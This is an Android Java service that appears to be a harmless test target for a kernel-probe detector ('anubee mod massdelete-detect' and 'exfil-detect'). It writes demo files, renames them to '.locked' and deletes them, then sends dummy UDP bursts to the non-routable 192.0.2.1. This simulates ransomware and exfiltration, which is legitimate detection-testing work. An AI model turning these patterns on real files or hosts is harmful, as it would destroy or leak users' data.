// SPDX-License-Identifier: GPL-2.0
package dev.anubee.moddemoapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

// Safe, self-contained demo target for `anubee mod massdelete-detect` /
// `anubee mod exfil-detect`. Every file touch stays inside
// /sdcard/Download/.anubee_demo/, the "sensitive" file it opens is one
// it wrote itself, and the network burst targets 192.0.2.1 (RFC 5737
// TEST-NET-1) -- reserved, never-routable, so nothing is ever actually
// delivered anywhere. No persistence, no obfuscation, no C2.
//
// Runs as a foreground service, not a plain background thread on the
// Activity: this device's OEM power manager (confirmed: Transsion/HiOS's
// Usf_Hiber freezer) suspends a backgrounded app's process ~5s after it
// loses foreground visibility -- regardless of held wake locks, since a
// wake lock only blocks device suspend, not this class of OEM app-freeze
// policy (a PARTIAL_WAKE_LOCK was tried first and confirmed, via logcat,
// not to prevent the freeze). A foreground service with an active
// notification is the standard, documented exemption from that class of
// background-process freezing.
public class DemoService extends Service {
    private static final String BASE_DIR = "/sdcard/Download/.anubee_demo";
    private static final int MASSDELETE_TOUCHES = 25;
    private static final int EXFIL_CHUNKS = 9;
    private static final int EXFIL_CHUNK_BYTES = 65000; // stays under the 65507-byte IPv4 UDP payload ceiling
    private static final String EXFIL_HOST = "192.0.2.1"; // RFC 5737 TEST-NET-1
    private static final int EXFIL_PORT = 9;
    private static final String CHANNEL_ID = "anubee-moddemo";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundCompat();
        new Thread(this::runDemo, "anubee-moddemo").start();
        return START_NOT_STICKY;
    }

    private void startForegroundCompat() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "anubee mod demo", NotificationManager.IMPORTANCE_LOW);
            nm.createNotificationChannel(channel);
        }
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("anubee mod demo (safe test target)")
                .setContentText("Running the massdelete/exfil demo sequence")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void runDemo() {
        try {
            Thread.sleep(3000); // let `anubee mod -P ...` attach its kprobes first
        } catch (InterruptedException ignored) {
            stopSelf();
            return;
        }
        massDeleteBurst();
        try {
            Thread.sleep(5000); // deliberate gap, longer than exfil-detect's EXFIL_RECENT_NS (3s),
                                 // so the two bursts stay temporally distinct -- without this,
                                 // massDeleteBurst()'s file opens and exfilBurst()'s trigger land
                                 // within ~1s of each other, which defeats any recency-based
                                 // evidence filtering meant to tell them apart.
        } catch (InterruptedException ignored) {
            stopSelf();
            return;
        }
        exfilBurst();
        stopSelf();
    }

    private void massDeleteBurst() {
        File dir = new File(BASE_DIR, "massdelete");
        dir.mkdirs();
        for (int i = 1; i <= MASSDELETE_TOUCHES; i++) {
            File original = new File(dir, "f" + i + ".txt");
            File renamed = new File(dir, "f" + i + ".txt.locked");
            try (FileOutputStream out = new FileOutputStream(original)) {
                out.write('x');
            } catch (IOException ignored) {
                continue;
            }
            original.renameTo(renamed);
            renamed.delete();
        }
    }

    // exfil-detect's on_sendto hook can target an unconnected UDP socket
    // directly via sendto()'s own dest_addr -- unlike its on_write/on_writev
    // hooks, which only ever fire on an fd already armed by a prior
    // non-loopback connect(). A blocking java.net.Socket would stall for
    // minutes against a non-routable address before any write() syscall
    // happened; a non-blocking SocketChannel throws NotYetConnectedException
    // from pure Java-side state tracking before reaching one at all. UDP
    // DatagramSocket.send() has neither problem: sendto(2) fires immediately
    // and unconditionally, no handshake required.
    private void exfilBurst() {
        File dir = new File(BASE_DIR, "exfil/DCIM");
        dir.mkdirs();
        File probe = new File(dir, "probe.jpg");
        try (FileOutputStream out = new FileOutputStream(probe)) {
            out.write('x'); // openat() on a /DCIM/ path arms exfil-detect
        } catch (IOException ignored) {
            return;
        }

        byte[] payload = new byte[EXFIL_CHUNK_BYTES];
        try {
            InetAddress dest = InetAddress.getByName(EXFIL_HOST);
            try (DatagramSocket sock = new DatagramSocket()) {
                DatagramPacket packet = new DatagramPacket(payload, payload.length, dest, EXFIL_PORT);
                for (int i = 0; i < EXFIL_CHUNKS; i++) {
                    sock.send(packet);
                }
            }
        } catch (IOException ignored) {
            // expected: 192.0.2.1 is guaranteed non-routable
        }
    }
}
